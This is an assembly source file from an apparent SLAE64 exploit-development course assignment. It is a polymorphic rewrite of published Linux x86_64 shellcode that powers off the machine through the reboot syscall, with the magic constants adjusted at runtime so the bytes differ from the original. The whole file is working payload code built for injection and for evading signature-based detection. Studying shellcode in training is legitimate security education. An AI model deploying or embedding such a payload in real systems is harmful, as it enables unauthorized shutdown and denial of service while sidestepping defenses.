; Student ID     : SLAE64-1611
; Student Name   : Jonathan "Chops" Crosby
; Assignment 6.3 : Polymorphic Conversion of Linux/x64 Shellcode Part Three of Three - Linux/x86_64 reboot(POWER_OFF)
; File Name      : poweroff.nasm
; Shell Storm    : http://shell-storm.org/shellcode/files/shellcode-602.php

section .text
global _start

_start:

xor rax, rax                ; zeroing out rax
mov al, 0xa9                ; setting rax to 0xa9 (sys_reboot)

mov     edx, 0x4321fedd     ; need to sub one to get 0x4321fedc
mov     esi, 0x2812196a     ; need to sub one to get 0x28121969
mov     edi, 0xfee1dead     ; keeping fee1dead the same for space issues

dec     dl                  ; should now be 0x4321fedc
dec     sil                 ; should now be 0x28121969

syscall                     ; call sys_reboot
